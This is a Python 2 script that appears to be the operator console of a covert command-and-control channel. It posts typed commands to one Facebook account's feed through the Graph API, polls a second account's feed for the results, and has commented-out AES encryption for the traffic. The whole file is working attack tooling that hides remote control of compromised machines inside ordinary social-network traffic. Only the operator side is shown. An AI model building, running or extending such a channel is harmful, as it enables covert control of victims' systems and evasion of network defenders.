#!/usr/bin/env python
import subprocess
import httplib
import urllib
import json
import sys
import time
from Crypto.Cipher import AES
from Crypto import Random

# Usage : 4 parameters (login1, token1, login2 ,token2)
# Goal : Allows to receive and sends commands / results from two facebook accounts 

userid1 = sys.argv[1]
access_token1 = sys.argv[2]
userid2 = sys.argv[3]
access_token2 = sys.argv[4]

#key = b'lablanquetteestbonnebienbonneoui'
#iv = Random.new().read(AES.block_size)
#cipher = AES.new(key, AES.MODE_CFB, iv)

if len(sys.argv) != 5:
	print "not enough arguments !"
	sys.exit()

while 1:
	#Second account access
	conn = httplib.HTTPSConnection("graph.facebook.com")
	conn.request("GET", "/" + userid2 + "/feed?access_token=" + access_token2)
	rep = conn.getresponse()
	json_rep = json.loads(rep.read())

	#Stock the last message id
	lastID = json_rep['data'][0]['id']
	
	#Prompt
	sys.stdout.write("12007#")
	msg_out = sys.stdin.readline()
	if msg_out == "exit\n":
		sys.exit()
	#msg_out = iv + cipher.encrypt(msg_out)
	
	#uploading command
	params = urllib.urlencode({'access_token' : access_token1,
			'message' :msg_out})
	conn.close()
	conn = httplib.HTTPSConnection("graph.facebook.com")
	conn.request("POST", "/" + userid1 + "/feed", params)
	conn.getresponse()
	
	#displaying responses
	#Second accound access
	conn.close()
	conn = httplib.HTTPSConnection("graph.facebook.com")
	conn.request("GET", "/" + userid2 + "/feed?access_token=" + access_token2)
	rep = conn.getresponse()
	json_rep = json.loads(rep.read())
	
	while lastID == json_rep['data'][0]['id'] :
		time.sleep(1)
		conn.close()
		conn = httplib.HTTPSConnection("graph.facebook.com")
		conn.request("GET", "/" + userid2 + "/feed?access_token=" + access_token2)
		rep = conn.getresponse()
		json_rep = json.loads(rep.read())

	msg_in = json_rep['data'][0]['message']
	#msg_in = cipher.decrypt(msg_in)
	print msg_in
	conn.close()

	
